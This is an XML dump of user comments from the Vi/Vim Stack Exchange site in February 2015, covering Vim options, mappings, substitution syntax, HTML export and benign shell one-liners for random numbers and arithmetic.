  <row Id="927" PostId="655" Score="0" Text="The second command does it; the first will change directory also when opening a file with `vim path/to/file` which I don't want." CreationDate="2015-02-12T22:21:14.950" UserId="188" />
  <row Id="928" PostId="731" Score="0" Text="This should work for you. Gnome Terminal has supported bracketed paste for a while." CreationDate="2015-02-12T22:36:06.520" UserId="411" />
  <row Id="929" PostId="742" Score="0" Text="@Carpetsmoker, yeah, that might be what I want. Thank you for editing the question title." CreationDate="2015-02-12T23:13:44.557" UserId="356" />
  <row Id="930" PostId="321" Score="0" Text="@ideasman42 Right ... I think I originally read this question as &quot;lines *or* words&quot; instead of &quot;lines *and* words&quot; ... In any case, doing this with words is non-obvious, UNIX programs work on lines, and Vim is no exception. I did some experimenting and sort of have a solution, but it doesn't work very well ... Maybe my approach is wrong, so I'll just leave it be for a few days and get back to it later." CreationDate="2015-02-13T00:25:04.587" UserId="51" />
  <row Id="933" PostId="742" Score="3" Text="I've been poking in the Vim source code working on the [normal history](http://vi.stackexchange.com/questions/570/can-i-see-the-history-of-key-presses-in-normal-mode). In `src/normal.c` the code calls `clear_showcmd()` in several places (`normal_cmd()`, `do_pending_operator()`, `end_visual_mode()`). I'm playing with dumping to a file the `showcmd_buf` at those points, which was looking pretty good, but makes me pretty sure that you can't get what you want without similarly modifying the Vim source code and rebuilding it. Of course, doing so might be worth the hassle to make your gifs." CreationDate="2015-02-13T04:57:06.070" UserId="227" />
  <row Id="934" PostId="614" Score="1" Text="It definitely matters if you're using Vi -- the concept of plugins doesn't exist for Vi. Of course, typing `vi` on any modern box will probably just launch `vim` with some features turned off. I doubt many people have access to *actual* Vi these days." CreationDate="2015-02-13T05:04:35.527" UserId="64" />
  <row Id="935" PostId="321" Score="0" Text="@Carpetsmoker not sure UNIX programs working on lines is related. QtCreator for example has this ability to send the selection to the stdout and then replace it with the stdin. It can be a single character or many lines (only the selected portions of partially selected lines). So I think it should be possible to do with vim, without a lot of trouble." CreationDate="2015-02-13T05:27:11.923" UserId="301" />
  <row Id="936" PostId="734" Score="0" Text="@onebree, see my edit." CreationDate="2015-02-13T09:07:29.097" UserId="54" />
  <row Id="937" PostId="734" Score="0" Text="@alxndr, see my edit." CreationDate="2015-02-13T09:07:50.770" UserId="54" />
  <row Id="938" PostId="743" Score="2" Text="You don't need `$PWD/**`, `**` is enough. Also, `.,**` is more useful because it lets you find files in the directory of the current file even if it is not under the working directory." CreationDate="2015-02-13T09:15:33.207" UserId="54" />
  <row Id="939" PostId="751" Score="0" Text="Thanks; not sure how I missed this yesterday; I was confused by the `&lt;Plug&gt;NetrwBrowseX` (I thought that was the function being called), it's fairly obvious now :-) ... Using `&lt;cfile&gt;` is good to know, but not something I can use here since this is part of a larger script." CreationDate="2015-02-13T09:47:29.627" UserId="51" />
  <row Id="940" PostId="321" Score="0" Text="@ideasman42 What I meant was, that this is how Vim (specifically `!`) behaves. If you want different behaviour, you'll have to code it manually (I can't find anything built-in for it), and that this is probably because most UNIX programs work on lines." CreationDate="2015-02-13T09:58:01.110" UserId="51" />
  <row Id="943" PostId="697" Score="0" Text="I've discovered a flaw in your answer so I have to un-accept it, see my answer for more details. Thank you for the great help." CreationDate="2015-02-13T10:30:04.467" UserId="13" />
  <row Id="944" PostId="734" Score="0" Text="@ OP -- Thank you. I will try these solutions out today and the weekend and choose the best one then. Since I use vim at work it's hard to stop working and fumble with .vimrc" CreationDate="2015-02-13T11:40:59.430" UserId="486" />
  <row Id="945" PostId="733" Score="0" Text="Related: [Navigating multiple files](http://vi.stackexchange.com/a/553/467)." CreationDate="2015-02-13T12:31:30.737" UserId="467" />
  <row Id="946" PostId="553" Score="0" Text="Related: [How to open multiple files in split mode?](http://vi.stackexchange.com/q/732/467)" CreationDate="2015-02-13T12:31:59.433" UserId="467" />
  <row Id="947" PostId="760" Score="2" Text="I would note that yanking a linewise motion into your register will have a side effect of including a newline character, as if you had pressed `Enter` at the end of your recording. In many cases this might be benign, but in scenarios where you've carefully crafted the cursor position at the end of the recording, it can affect the repeatability." CreationDate="2015-02-13T13:53:45.760" UserId="64" />
  <row Id="948" PostId="697" Score="2" Text="@toro2k Thanks. I didn't know about that. I edited my answer, I also added `silent` so you won't get a message if you're not using this `autogroup`. I also fixed another problem I noticed: `:w another_name` didn't work (not it works)." CreationDate="2015-02-13T14:16:03.000" UserId="51" />
  <row Id="949" PostId="760" Score="0" Text="@tommcdo Right; you can just use `v` and select the entire line (without the newline)." CreationDate="2015-02-13T14:16:51.093" UserId="51" />
  <row Id="950" PostId="697" Score="0" Text="Definetly better! Thank you! Just a question, why you have used `write filename` instead of just `write`?" CreationDate="2015-02-13T14:27:55.700" UserId="13" />
  <row Id="951" PostId="697" Score="2" Text="@toro2k Because otherwise `write` will just write to current filename (just like when you type `:write`), and `:write another_filename` won't work (it will still use the original filename)." CreationDate="2015-02-13T14:43:55.540" UserId="51" />
  <row Id="952" PostId="697" Score="0" Text="O yes, now I understand! :-)" CreationDate="2015-02-13T14:44:45.357" UserId="13" />
  <row Id="953" PostId="765" Score="0" Text="&quot;If you don't want to clutter your screen with highlighted spaces everywhere&quot; this assumes too much about the OP's setup." CreationDate="2015-02-13T15:26:39.147" UserId="54" />
  <row Id="954" PostId="765" Score="0" Text="@romainl Better?" CreationDate="2015-02-13T15:28:11.020" UserId="13" />
  <row Id="955" PostId="765" Score="1" Text="Yes, it's better IMO." CreationDate="2015-02-13T15:42:07.570" UserId="54" />
  <row Id="956" PostId="742" Score="0" Text="Thank you so much for the trouble, @JohnO'M. If you arrive to a conclusion make sure to post it as an answer. I searched the web (quite) a bit for this kind of feature and found nothing." CreationDate="2015-02-13T15:53:14.863" UserId="356" />
  <row Id="957" PostId="765" Score="0" Text="Is `\r` the newline or `\n`?" CreationDate="2015-02-13T16:06:01.090" UserId="205" />
  <row Id="958" PostId="765" Score="2" Text="It is `\r`, see `:help s/\r`. It could be replaced by a literal newline typing `&lt;c-v&gt;&lt;cr&gt;`. In this context `\n` is a null character, see `:help s/\n`." CreationDate="2015-02-13T16:09:01.223" UserId="13" />
  <row Id="959" PostId="746" Score="0" Text="Not that cursor-movement doesn't make sense, but doesn't it make more sense to use vims terminology?" CreationDate="2015-02-13T16:53:38.420" UserId="488" />
  <row Id="962" PostId="766" Score="0" Text="Could you clarify your preface? Do you wish to avoid all plugins, or just ones similar to the two you mention? If the latter, what about those two do you not like?" CreationDate="2015-02-13T19:11:39.123" UserId="163" />
  <row Id="963" PostId="766" Score="0" Text="I do not want to use any plugins for this. I've updated the preface." CreationDate="2015-02-13T19:14:39.807" UserId="489" />
  <row Id="964" PostId="2" Score="1" Text="Here's a small abbreviation:&#xA;:set nu &quot; to enable&#xA;:set nonu &quot; to disable" CreationDate="2015-02-13T19:30:18.763" UserId="496" />
  <row Id="966" PostId="774" Score="0" Text="@Carpetsmoker dang you beat me to it by seconds! :D OP: also try: http://vi.stackexchange.com/questions/710/can-i-paste-a-yanked-line-even-if-i-delete-a-line/711#711" CreationDate="2015-02-13T19:53:03.840" UserId="205" />
  <row Id="967" PostId="771" Score="0" Text="Could you provide an example on how to reproduce this? Because I don't quite follow what the problem is. I've never noticed this prompt, and I can't get it to appear even with very long paths..." CreationDate="2015-02-13T19:57:01.870" UserId="51" />
  <row Id="968" PostId="762" Score="0" Text="Related to the extra window, see: http://vi.stackexchange.com/a/544/205" CreationDate="2015-02-13T19:58:53.777" UserId="205" />
  <row Id="970" PostId="769" Score="2" Text="possible duplicate of [How can I copy text to the system clipboard from Vim?](http://vi.stackexchange.com/questions/84/how-can-i-copy-text-to-the-system-clipboard-from-vim) .... This is covered in (my) accepted answer I think (unless I misunderstood the question): *&quot;if you use gVim, you can get copy-on-select behaviour when using `:set guioptions+=a`. This is enabled by default on X11 systems (copies to PRIMARY)*&quot;" CreationDate="2015-02-13T20:02:06.897" UserId="51" />
  <row Id="972" PostId="766" Score="0" Text="I understand that a plugin is just vimscript, but I don't want all the extra stuff those plugins add. I just want that very simple use case that I outlined. I may dive into the source of some of them and see if I can pull out some code that does what I want." CreationDate="2015-02-13T20:06:24.993" UserId="489" />
  <row Id="973" PostId="767" Score="0" Text="This actually seems to work? If I use `:set mouse=a number`, select some text with the mouse, and paste it, I *don't* get the numbers? I tested both in Vim and gVim on Linux." CreationDate="2015-02-13T20:10:08.010" UserId="51" />
  <row Id="974" PostId="771" Score="0" Text="Done; the &quot;press enter&quot; (:help press-enter) prompt shows up when vim is about to redraw the screen after printing stuff for you to read that didn't all fit on the screen; it &quot;helpfully&quot; doesn't want you to miss that information. But in this case, the information is simply telling me &quot;you opened these two files&quot; which I know... because I opened them." CreationDate="2015-02-13T20:11:27.077" UserId="72" />
  <row Id="975" PostId="776" Score="0" Text="Yes! The `O` option, in particular, was never one I tried along with t/T apparently." CreationDate="2015-02-13T20:41:38.557" UserId="72" />
  <row Id="976" PostId="769" Score="2" Text="@Carpetsmoker Only part of this is covered in that (useful) post and I believe this somewhat different use case deserves specific treatment. Making this a duplicate will not make it easier to sort out for people with this specific goal in mind." CreationDate="2015-02-13T20:54:10.680" UserId="267" />
  <row Id="977" PostId="767" Score="0" Text="@Carpetsmoker Ty, this is the solution." CreationDate="2015-02-13T21:10:23.483" UserId="153" />
  <row Id="978" PostId="766" Score="0" Text="You definitely have to dive into Vimscript to get this done.  Regular expressions are not powerful enough, by themselves, to handle balanced characters." CreationDate="2015-02-13T21:27:36.533" UserId="93" />
  <row Id="980" PostId="780" Score="3" Text="possible duplicate of [Using % in languages without curly braces](http://vi.stackexchange.com/questions/126/using-in-languages-without-curly-braces) ... This solution also works for HTML (just tested it, if you're on a `&gt;` it will work like before, if you're on the `div` it will work like you want)." CreationDate="2015-02-13T22:11:26.747" UserId="51" />
  <row Id="981" PostId="750" Score="0" Text="This works for `iq`, but doesn't seem to work with, for example, `daq`." CreationDate="2015-02-13T22:13:17.863" UserId="88" />
  <row Id="982" PostId="766" Score="0" Text="@QuincyBowers You're definitely right.. What do you think some pseudo-code for this would look like?" CreationDate="2015-02-13T23:05:21.593" UserId="489" />
  <row Id="983" PostId="766" Score="1" Text="I've voted to close this question.  I think the basic *topic* as such is fine, but your restrictions make it a &quot;please write some code for me plz kthxbye&quot;-question right now. I don't think we want to allow these sort of questions here..." CreationDate="2015-02-13T23:07:50.847" UserId="51" />
  <row Id="984" PostId="766" Score="1" Text="@Carpetsmoker Beyond the wording of this question is a problem that has yet to be solved in any plugin that I have seen. It seems clear to me that once this question is answered successfully, every auto-closing or auto-pair type plugin will be able to benefit from its solution. How would you suggest I change the wording to make it acceptable?" CreationDate="2015-02-13T23:13:25.657" UserId="489" />
  <row Id="985" PostId="775" Score="1" Text="There are already Normal mode mappings for maximizing the window in one dimension: `&lt;C-W&gt;|` for horizontal and `&lt;C-W&gt;_` for vertical." CreationDate="2015-02-13T23:24:19.237" UserId="64" />
  <row Id="986" PostId="766" Score="0" Text="Your diagram is confusing. Is the cursor on the column before the bar or after it (for &quot;(|)&quot; is the cursor on the open or close paren)? Do you want this to work in normal mode or insert mode?" CreationDate="2015-02-13T23:37:49.227" UserId="72" />
  <row Id="987" PostId="766" Score="0" Text="I have updated the question" CreationDate="2015-02-13T23:42:41.250" UserId="489" />
  <row Id="988" PostId="780" Score="0" Text="@Carpetsmoker If this question would be duplicated of general-like answer (using one plugin), then it won't allow for any answers which are dealing with html tags specifically." CreationDate="2015-02-14T00:02:47.113" UserId="467" />
  <row Id="989" PostId="780" Score="0" Text="However, the other question has exactly the same answer, so this is a duplicate." CreationDate="2015-02-14T00:04:56.673" UserId="88" />
  <row Id="990" PostId="780" Score="0" Text="Posted sample answer which won't fit into other question, so it's not duplicate then." CreationDate="2015-02-14T00:20:17.497" UserId="467" />
  <row Id="992" PostId="780" Score="1" Text="@Doorknob The fact that two questions happen to have the same answer does not necessarily mean that the questions are duplicates of each other." CreationDate="2015-02-14T05:49:36.043" UserId="24" />
  <row Id="994" PostId="780" Score="0" Text="Same question, same answer." CreationDate="2015-02-14T07:33:12.783" UserId="54" />
  <row Id="995" PostId="766" Score="0" Text="For what it's worth I vote *against* closing this question." CreationDate="2015-02-14T09:15:11.730" UserId="130" />
  <row Id="996" PostId="778" Score="0" Text="Is a VCS of any kind in use for your respective folders? That would open up a whole range of answers and plugins that may not be available for flat folders." CreationDate="2015-02-14T09:25:39.750" UserId="267" />
  <row Id="997" PostId="789" Score="4" Text="This is a [UUOC](http://en.wikipedia.org/wiki/Cat_%28Unix%29#Useless_use_of_cat); simply use `vim '+:0,$s/foo/test/g' '+:wq! file2' file1` instead." CreationDate="2015-02-14T12:49:40.347" UserId="88" />
  <row Id="999" PostId="791" Score="0" Text="Sorry, I didn't see that one. Thanks." CreationDate="2015-02-14T13:56:55.850" UserId="467" />
  <row Id="1000" PostId="792" Score="3" Text="What do you mean by converting? What is expected output?" CreationDate="2015-02-14T14:41:33.293" UserId="153" />
  <row Id="1001" PostId="792" Score="0" Text="Expected output would be html (browser friendly format)." CreationDate="2015-02-14T14:42:14.633" UserId="467" />
  <row Id="1003" PostId="792" Score="1" Text="All text files are 'browser friendly'. But when I see [Alexander Myshov's answer](http://vi.stackexchange.com/a/793/153) I think I understand what you mean." CreationDate="2015-02-14T14:45:46.203" UserId="153" />
  <row Id="1004" PostId="766" Score="2" Text="@merb, the paredit plugin does exactly what you want.  If you want that functionality without actually using the plugin then I suggest you examine the source on github.  I think that would be more instructive than me trying to reproduce a version of it here.  https://github.com/kovisoft/paredit" CreationDate="2015-02-14T16:56:00.850" UserId="93" />
  <row Id="1005" PostId="798" Score="4" Text="Just curious, what are you trying to accomplish? As in, what will vim do for you here that some other tool might not?" CreationDate="2015-02-14T17:32:33.877" UserId="411" />
  <row Id="1006" PostId="775" Score="1" Text="This is a nice trick, so that why I +1 it. but it doesn't give a solution to my problem. open the window in specific size as default." CreationDate="2015-02-14T17:32:49.717" UserId="496" />
  <row Id="1007" PostId="798" Score="0" Text="@JayThompson I'm trying to use `vim` for file parsing instead of `sed` (e.g. mass repeated complex changes to multiple large files). The example doesn't do anything to keep it simple and not making potential duplicate of another [post](http://vi.stackexchange.com/q/788/467)." CreationDate="2015-02-14T17:37:37.753" UserId="467" />
  <row Id="1008" PostId="798" Score="0" Text="You know about vipe, so any reason you're not using it?" CreationDate="2015-02-14T17:51:33.837" UserId="205" />
  <row Id="1009" PostId="798" Score="0" Text="@muru I didn't use it yet, not much documentation available and it's [off-topic](http://meta.vi.stackexchange.com/q/188/467) here." CreationDate="2015-02-14T17:53:04.467" UserId="467" />
  <row Id="1010" PostId="798" Score="0" Text="Questions about vipe might be, but there's no reason it can't be the answer. So I am wondering why I shouldn't post it as an answer." CreationDate="2015-02-14T17:56:06.890" UserId="205" />
  <row Id="1011" PostId="798" Score="0" Text="@muru Try answering with `vipe`, sounds interesting. I've found the solution for `vim` already, easier than I thought, I'll post it as well." CreationDate="2015-02-14T17:57:39.037" UserId="467" />
  <row Id="1013" PostId="745" Score="0" Text="The help text for path says it's recommended that you append instead of assign, so if the plugin is overwriting the path, perhaps it should be treated as a bug and a issue raised on Github." CreationDate="2015-02-14T19:07:35.347" UserId="205" />
  <row Id="1014" PostId="745" Score="0" Text="I raised the bug, but it was closed almost immediately and I was fairly satisfied with the reasoning. If you or anyone else feels it should be reopened and is affected by it feel free to comment, the issue shouldn't be too hard to find on GitHub" CreationDate="2015-02-14T19:11:57.437" UserId="489" />
  <row Id="1015" PostId="13" Score="0" Text="There are some activities for which a keyboard will always be a more suitable interface than a touch screen. Writing code is probably one of them. Other tasks that you use vi for might be more naturally done with another application when you're on a tablet." CreationDate="2015-02-14T19:13:51.077" UserId="460" />
  <row Id="1016" PostId="804" Score="0" Text="This does work. And with no side effects. I should learn to use maps. Thank you." CreationDate="2015-02-14T19:36:51.363" UserId="356" />
  <row Id="1017" PostId="766" Score="0" Text="@QuincyBowers Thank you for pointing that out. Hopefully I'll be able to post an answer to this soon.." CreationDate="2015-02-14T19:48:33.633" UserId="489" />
  <row Id="1021" PostId="688" Score="0" Text="Perhaps.. Or is this more general?" CreationDate="2015-02-14T22:25:53.020" UserId="205" />
  <row Id="1022" PostId="809" Score="0" Text="I was hoping to be able to append `**` to the path, and then remove specific files and directories that would be matched by `**`. I cannot remove a specific file using `set path-=whatever` when I use the wildcard `**` ." CreationDate="2015-02-14T22:26:51.370" UserId="489" />
  <row Id="1023" PostId="807" Score="1" Text="Pure vim? Or, say, using `:python`?" CreationDate="2015-02-14T22:28:08.100" UserId="205" />
  <row Id="1024" PostId="809" Score="0" Text="Use `:help wildignore` to ignore specific directories and files." CreationDate="2015-02-14T22:28:56.147" UserId="54" />
  <row Id="1025" PostId="807" Score="0" Text="Pure vim preferred, but if it's not build-in, any easy memorable method is fine." CreationDate="2015-02-14T22:36:58.840" UserId="467" />
  <row Id="1026" PostId="688" Score="0" Text="It's similar, but I wouldn't know what are permanent line numbers. Secondly the other question is about all lines (and the answer does that) for gVim on Windows specifically and this is simple numbered list for one paragraph only in plain vim." CreationDate="2015-02-14T22:42:03.403" UserId="467" />
  <row Id="1028" PostId="688" Score="2" Text="Well, I guess that post uses &quot;permanent&quot; ot indicate that the buffer is to be modified, and that the numbers aren't some purely visual thing (same as you). The reason for specifying gvim on Windows is to avoid external utilities like `cat` or `nl`, which can do number lines, but aren't generally available on Windows (as OP indicates from their comment about `awk`). The top two solutions are pure Vim. Lastly, all lines vs one para is just a matter of range selection. Clearly not a big issue." CreationDate="2015-02-14T22:45:43.103" UserId="205" />
  <row Id="1029" PostId="808" Score="0" Text="So I've added in this case [tag:unix] as I'm on OSX, as I'm not limiting to pure vim, especially on Windows. So in this case it's not duplicate. Then Unix commands are welcomed." CreationDate="2015-02-14T22:49:44.387" UserId="467" />
  <row Id="1031" PostId="688" Score="0" Text="Still not convinced, as you can get Cygwin, MSYS and SUA on Windows, and the last answer (`cat -n`) covers that case, but not for paragraphs, I suppose." CreationDate="2015-02-14T22:51:11.783" UserId="205" />
  <row Id="1033" PostId="809" Score="0" Text="I dont believe that `wildignore` supports relative paths.." CreationDate="2015-02-14T23:20:18.000" UserId="489" />
  <row Id="1034" PostId="812" Score="0" Text="Instead of `tr -d '[:space:]'`, perhaps `tr -cd '[:digit:]'` for the grep filter?" CreationDate="2015-02-14T23:33:52.793" UserId="205" />
  <row Id="1035" PostId="812" Score="0" Text="@muru I'm not sure that will work on OSX, which is why I didn't use it... You also get the numbers seperated by a newline this way, like the OP asked...." CreationDate="2015-02-14T23:35:21.147" UserId="51" />
  <row Id="1036" PostId="812" Score="0" Text="If that's the case.... GNU beats BSD. :P" CreationDate="2015-02-14T23:36:16.477" UserId="205" />
  <row Id="1039" PostId="808" Score="0" Text="The other answer covers many different sort of answers; including Vim-only and UNIX-only. Actually, the UNIX-only will also work on windows if you have msysgit or cygwin installed. Unless there's a compelling reason why none of the answers work for you, I see no reason to add another question (and thus, this is a duplicate)." CreationDate="2015-02-14T23:47:29.893" UserId="51" />
  <row Id="1040" PostId="810" Score="0" Text="@Carpetsmoker [`random.sample`](https://docs.python.org/2/library/random.html#random.sample) repuires only two arguments on Python 2, [`str`](https://docs.python.org/2/library/functions.html?highlight=str#str) is the builtin function to convert things to strings. Let me look up the Py3 equivalents (`str` would be the same, will have to check `xrange` and `random.sample`)." CreationDate="2015-02-14T23:47:31.397" UserId="205" />
  <row Id="1042" PostId="810" Score="0" Text="@Carpetsmoker aargh, typo. The bracket after 60 is supposed to be after 10000. And `xrange` is not in Python3 because `range` is equivalent (neither actually constructs a list, unlike `range` in Py2)." CreationDate="2015-02-14T23:55:08.960" UserId="205" />
  <row Id="1043" PostId="810" Score="0" Text="@Carpetsmoker And the final difference is that `map` in Py3 returns an iterable and not a list, so the last line would use `list(map(str, random.sample(range(10000), 60)))`" CreationDate="2015-02-14T23:58:13.500" UserId="205" />
  <row Id="1045" PostId="805" Score="1" Text="It's not clear to me what you are trying to accomplish? Your example doesn't make any sense, what behaviour exactle do you want?" CreationDate="2015-02-15T00:08:46.840" UserId="51" />
  <row Id="1046" PostId="803" Score="0" Text="Can't use type 2 backticks to get a backtick? Or configure your OS to do that? That's still an extra keystoke, but better than ` + space ..." CreationDate="2015-02-15T00:10:50.413" UserId="51" />
  <row Id="1047" PostId="794" Score="1" Text="You don't need the `%`, since that's the default. Also note that this is exactly the same as the other answer (`:runtime! syntax/2html.vim`), the only difference is that with `TOhtml` you can add easily a range (instead of setting `g:html_start_line` and `g:html_end_line` manually." CreationDate="2015-02-15T00:14:52.520" UserId="51" />
  <row Id="1050" PostId="803" Score="0" Text="@Carpetsmoker No. Typing two backticks normally results in \`\` for me. But in Normal mode it seems like another thing happens: I type  \`\`a and Vim says &quot;E78: Unknown mark.&quot; From `showcmd` I think Vim understands this as \`à. Also I would like to make the behaviour OS independent. `map` seems to do the work." CreationDate="2015-02-15T00:34:44.840" UserId="356" />
  <row Id="1051" PostId="810" Score="0" Text="Okay, I've taken the liberty to edit your post with some (minor) changes to make it compatible with both Python 2 and 3..." CreationDate="2015-02-15T00:51:52.653" UserId="51" />
  <row Id="1053" PostId="688" Score="0" Text="Then there is no point of having OS-dependent tags, if you can always install cygwin/msysgit." CreationDate="2015-02-15T01:42:10.470" UserId="467" />
  <row Id="1054" PostId="688" Score="0" Text="And if we want to keep OS-dependent tags, then Windows question shouldn't have Unix-like answers and these should be moved here, so both questions could have different answers." CreationDate="2015-02-15T01:47:24.897" UserId="467" />
  <row Id="1055" PostId="804" Score="0" Text="You're welcome. Glad I could help." CreationDate="2015-02-15T03:05:41.670" UserId="227" />
  <row Id="1058" PostId="797" Score="1" Text="Just wanted to add that `bc` can be good for quick math, i.e., `:r! bc -l &lt;&lt; '2^30'`." CreationDate="2015-02-15T06:40:33.700" UserId="44" />
  <row Id="1059" PostId="812" Score="0" Text="One can also use the shell (system) for inputting random numbers, i.e. `:r! hexdump -n $((3*4)) -e  '&quot;%d&quot;' /dev/urandom`, would generate 3 random signed integers." CreationDate="2015-02-15T07:13:20.950" UserId="44" />
  <row Id="1060" PostId="813" Score="0" Text="After typing `1. &lt;esc&gt;h` you are on the second column, not first column. I would replace the `h` with `0`, after which I think your solution should be very good." CreationDate="2015-02-15T09:26:36.077" UserId="21" />
  <row Id="1061" PostId="811" Score="2" Text="This does not give the same formatting as given in the question. However, I like the simplicity of the solution." CreationDate="2015-02-15T09:27:20.323" UserId="21" />
  <row Id="1062" PostId="809" Score="0" Text="Observation is better than belief." CreationDate="2015-02-15T10:04:38.430" UserId="54" />
  <row Id="1063" PostId="810" Score="0" Text="@Carpetsmoker cool! Thanks!" CreationDate="2015-02-15T13:35:06.763" UserId="205" />
  <row Id="1064" PostId="813" Score="0" Text="@KarlYngveLervåg Whoops, that was a typo. Thanks, fixed it." CreationDate="2015-02-15T14:18:32.217" UserId="88" />
  <row Id="1065" PostId="822" Score="0" Text="NERDTree defines a configuration variable too, it's `NERDTreeWinSize`." CreationDate="2015-02-15T19:00:55.193" UserId="13" />
  <row Id="1066" PostId="811" Score="0" Text="@KarlYngveLervåg Thanks, included that in the answer." CreationDate="2015-02-15T22:12:48.243" UserId="467" />
  <row Id="1069" PostId="819" Score="0" Text="It also works with `zsh`, but not with `sh`, `dash`, `fish`, `csh`, or `tcsh` ... You could use `:r! bash -c 'echo $RANDOM'` ..." CreationDate="2015-02-15T23:24:37.590" UserId="51" />
  <row Id="1070" PostId="822" Score="0" Text="@toro2k Right you are sir! I looked through the options list and I couldn't find it. I'm updating my answer." CreationDate="2015-02-16T00:53:05.270" UserId="227" />
  <row Id="1071" PostId="822" Score="0" Text="^ That should have read &quot;I looked through the options list and couldn't find anything related to size when I originally wrote the answer&quot;" CreationDate="2015-02-16T01:06:41.707" UserId="227" />
  <row Id="1073" PostId="836" Score="0" Text="possible duplicate of [How can I find out what &lt;Leader&gt; is set to?](http://vi.stackexchange.com/questions/281/how-can-i-find-out-what-leader-is-set-to)" CreationDate="2015-02-16T04:17:54.703" UserId="246" />
  <row Id="1074" PostId="836" Score="5" Text="Akshay: Not a duplicate, that wants to check the value of `&lt;leader&gt;`, this one wants to know what `&lt;leader&gt;` means. So that that value can be interpreted. It is the difference between asking &quot;In newton motion what is v?&quot; and &quot;Given an apple falled from a 10m high tree, what is v when it hits the ground?'" CreationDate="2015-02-16T04:26:37.620" UserId="360" />
  <row Id="1075" PostId="838" Score="5" Text="Your title mentions tabs, but the body of your question doesn't. Do you mean multiple spaces between words? Or do you mean something that interacts with tabs? I guess I would benefit from a concrete example" CreationDate="2015-02-16T06:44:56.570" UserId="130" />
  <row Id="1076" PostId="836" Score="0" Text="fair, thanks for the cool analogy :)" CreationDate="2015-02-16T08:34:53.000" UserId="246" />
  <row Id="1077" PostId="834" Score="5" Text="@Carpetsmoker I think this question is broader. The author is not just asking how to set parameters in a buffer of a particular filetype, but to a certain extent *what* parameters to set to ensure privacy. That's certainly not obvious or collected together in a central place, so I think it makes a good question." CreationDate="2015-02-16T08:42:22.457" UserId="91" />
  <row Id="1078" PostId="819" Score="0" Text="*&quot;return last few digits from the current timestamp&quot;* -&gt; This is not random. Using the time to get a pseudo-random number is almost always a bad idea, *even* for non-crypto purposes. What if the timestamp's resolution is in seconds and you create a &quot;file.$random&quot; twice in a second? Oops! ... Plus, you never know when someone's going to use your `GetRandom()` function where good prng *does* matter, so it's better to just get it right from the start if possible (and it's almost always possible here!)" CreationDate="2015-02-16T10:06:22.137" UserId="51" />
  <row Id="1080" PostId="813" Score="0" Text="No problem. However, you still have not updated the explanation. Also: On many keyboards, `^` waits for a second character in order to allow typing combinations like `^a -&gt; â`. I still agree its the best solution, but I think this should be mentioned as well." CreationDate="2015-02-16T10:48:27.927" UserId="21" />
  <row Id="1081" PostId="819" Score="0" Text="I don't know what the quality of `$RANDOM` is, but if this is a poor PRNG then that's not a reason to use an even poorer PRNG :-) Instead, upgrade to a better PRNG! As far as I know, `/dev/urandom` is available on all platforms where `bash` is commonly available, so I don't see a reason to *not* use it." CreationDate="2015-02-16T10:59:09.990" UserId="51" />
  <row Id="1089" PostId="843" Score="0" Text="You're free to add any answer you want, of course, but isn't this answer really the same as my answer from almost 2 weeks ago? Or in other words, how does this answer add anything?" CreationDate="2015-02-16T12:19:51.490" UserId="51" />
  <row Id="1090" PostId="792" Score="0" Text="I think a detail is missing from the question. Do you want to produce a full HTML document for each source file or just a fragment of HTML code you can embed in another document, or it doesn't matter?" CreationDate="2015-02-16T12:22:27.823" UserId="13" />
  <row Id="1091" PostId="843" Score="0" Text="@Carpetsmoker My source was based on [vim wikia](http://vim.wikia.com/wiki/Remove_unwanted_spaces) as posted, I didn't know what you posted 2 weeks ago. How to search for spaces, no any source is needed (it's obvious). Second part [as well from wikia](http://vim.wikia.com/wiki/Remove_unwanted_spaces#Automatically_removing_all_trailing_whitespace), but I've modified it slightly." CreationDate="2015-02-16T12:29:43.960" UserId="467" />
  <row Id="1092" PostId="843" Score="1" Text="*&quot;I didn't know what you posted 2 weeks ago&quot;* -&gt; Well, the answer is right here on this page ...? I also don't understand how using wikia as a source relates to my question (how does this answer add anything)?" CreationDate="2015-02-16T12:34:38.337" UserId="51" />
  <row Id="1093" PostId="843" Score="0" Text="Ah, yes, if you're referring to this post. I've just scanned your post quickly, and I thought it's different, as you had a lot of functions there (I didn't read it), and your first command had `e` at the end, so initially I thought it's different command. I'll try to change it to something else, sorry for the confusion." CreationDate="2015-02-16T12:35:50.307" UserId="467" />
  <row Id="1094" PostId="843" Score="0" Text="Changed to different command, hope that helps." CreationDate="2015-02-16T12:42:16.227" UserId="467" />
  <row Id="1095" PostId="758" Score="2" Text="Now that you have answerd the question yourself I'm pretty confused about what you're asking. From the question I understand you are asking how to rearrange opened windows in a different layout but from your answer I understand you want to close all the opened windows but one, and to open all listed buffers in splitted windows." CreationDate="2015-02-16T12:54:00.500" UserId="13" />
  <row Id="1096" PostId="837" Score="6" Text="I believe that the rationale behind the `&lt;Leader&gt;` is that it provides you with a &quot;clean&quot; way to provide custom shortcuts, without overriding existing Vim shortcuts." CreationDate="2015-02-16T13:00:15.937" UserId="51" />
  <row Id="1097" PostId="838" Score="1" Text="Agreed, can you provide a concrete example please? Bit confused why you'd want this, which makes me think we/I don't understand the question." CreationDate="2015-02-16T13:02:10.427" UserId="91" />
  <row Id="1098" PostId="758" Score="0" Text="@toro2k I've opened multiple files using `-p`, `-o`, `-O` which appear in different split layouts, but I'd like to know how to switch between different layouts while I'm editing them (in the editor, without quitting and re-opening files again)." CreationDate="2015-02-16T13:03:10.393" UserId="467" />
  <row Id="1099" PostId="843" Score="1" Text="So now you've made the answer (minimally) different for the sake of making it different? Adding the `/g` flag does nothing here, since ` +$` already matches all spaces. You're also only matching spaces, and not all whitespace (ie. tabs)." CreationDate="2015-02-16T13:05:23.590" UserId="51" />
  <row Id="1100" PostId="843" Score="0" Text="OP didn't specify what he mean by whitespaces, so the example removes white spaces only, not tabs, so it's doing what OP exactly wants as he didn't mentioned tabs." CreationDate="2015-02-16T13:18:25.230" UserId="467" />
  <row Id="1101" PostId="847" Score="0" Text="Yes, your test seems to work for me also. But it doesn't work with my nnoremap mapping - I am wondering if that's because I am using &lt;expr&gt; in my mapping. Investigating..." CreationDate="2015-02-16T13:36:01.967" UserId="91" />
  <row Id="1102" PostId="847" Score="0" Text="I tried simplifying my mapping to `nnoremap &lt;Leader&gt;x ':new ~/Desktop/x.txt'` to remove the &lt;expr&gt;. But `vim -c 'execute &quot;normal \\x&quot;'` gives &quot;Error detected while processing command line: E78: Unknown mark&quot;. Any thoughts why?" CreationDate="2015-02-16T13:38:52.100" UserId="91" />
